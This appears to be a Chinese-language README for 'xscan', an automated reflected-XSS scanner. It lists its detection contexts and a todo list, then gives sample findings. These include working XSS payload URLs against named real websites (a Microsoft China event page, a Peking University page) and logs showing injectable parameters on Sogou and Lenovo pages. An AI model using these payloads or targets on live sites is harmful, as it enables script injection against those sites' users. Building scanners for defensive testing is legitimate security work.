## Xscan 介绍
1. xscan使用html与javascript词法分析技术自动寻找反射XSS漏洞，自带爬虫，只需要输入url就能自动寻找xss漏洞。
2. xscan支持对get、uri、header、cookie、post检测。

## 参数
- spider传递的
- top xss参数
- 从js变量获取参数/从html input获取参数

## 检测技术

- 针对html xss注入
    - html tag
    - style
    - attibute
    - attibute_key
    - attibute_value
- 针对js xss注入
    - js-string
    - js-template
    - js-BlockComment
    - js-LineComment
    - js-Identifier
    - js-Other 其他ast token回显了内容
- other
    - xml ref
    - 多回显内容的引号逃逸控制变量

## todo

写todo的目的是能看到如何从一个小的case成长为一个复杂的工程化工具的

- [x] 读取或自定义GET参数
- [ ] 读取或自定义POST参数
- [ ] 读取或自定义Cookie参数
- [x] xss发射器能识别url encode参数并自动对其转换
- [x] xss发射器从发送的header头识别出对应编码 application/json

## case

- https://english.sogou.com/english?b_o_e=1&ie=utf8&fr=pcweb_index_nav&query=okkem
    - 针对大量回显和相同情况，程序内会重复发送无用包，需要优化
  ```
  time="2022-04-12 21:08:02" level=info msg="AttibuteValue ov属性可控 https://english.sogou.com/english?b_o_e=1&fr=pcweb_index_nav&ie=utf8&query=mfkjmd query=mfkjmd query=alert(1)"

time="2022-04-12 21:08:02" level=info msg="AttibuteValue
value属性可控 https://english.sogou.com/english?b_o_e=1&fr=pcweb_index_nav&ie=utf8&query=mfkjmd query=mfkjmd query=alert(1)"
time="2022-04-12 21:08:21" level=info msg="AttibuteValue
ov属性可控 https://english.sogou.com/english?b_o_e=1&fr=pcweb_index_nav&ie=utf8&query=mfkjmd query=mfkjmd query=alert(1)"
time="2022-04-12 21:08:21" level=info msg="AttibuteValue
value属性可控 https://english.sogou.com/english?b_o_e=1&fr=pcweb_index_nav&ie=utf8&query=mfkjmd query=mfkjmd query=alert(1)"

  ```
- [x] https://reg.lenovo.com.cn/pwd/findpwd?ticket=5e9b6d3d-4500-47fc-b32b-f2b4a1230fd3&ru=https://mclub.lenovo.com.cn/home.html?mod=space&do=profile&mycenter=1
  - 参数要带有 https://mclub.lenovo.com.cn/home.html 前缀

- success
  - https://chinaevent.microsoft.com/app/meetings/MeetingPc/Detail?channel_id=%27-window[%27\x61\x6c\x65\x72\x74%27](1)-%27&channel_name=channel3&id=416&pf_type=3&pf_uid=5407_3&source=2&tag_id=6d1c8cef53f20a5f
    - js string
  - https://www.oce.pku.edu.cn/cms/xdyxgk/index.htm?range=%0Aprompt``%2F%2F&type=xdyxxm
    - js comment

- 误打误撞，mysql报错
  - https://a.39zn.cn/ad/?id=%3Cbw0klf